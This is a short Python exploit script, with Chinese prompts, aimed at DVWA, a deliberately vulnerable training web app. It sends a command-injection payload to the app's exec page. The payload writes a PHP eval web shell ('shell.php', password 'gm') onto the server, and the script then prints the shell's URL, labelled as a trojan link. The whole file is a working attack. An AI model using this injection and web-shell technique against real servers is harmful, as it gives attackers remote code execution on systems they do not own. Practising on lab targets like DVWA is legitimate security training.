import sys

import requests
import re
import time
import base64
import datetime
import uuid
import os


def dvwa(toda_url): #鬼魅
    data={'Submit':'1','ip':'1||echo "<?php eval($_POST[gm]);?>" >shell.php'}
    exp1=requests.post(url=toda_url+'/vulnerabilities/exec/source/low.php',data=data)
    print(exp1.status_code)
    if exp1.status_code==200:
        print('木马链接：'+toda_url+'/vulnerabilities/exec/source/shell.php'+'\n木马密码gm\n')
dvwa(input('请输入dvwa的链接\n'))
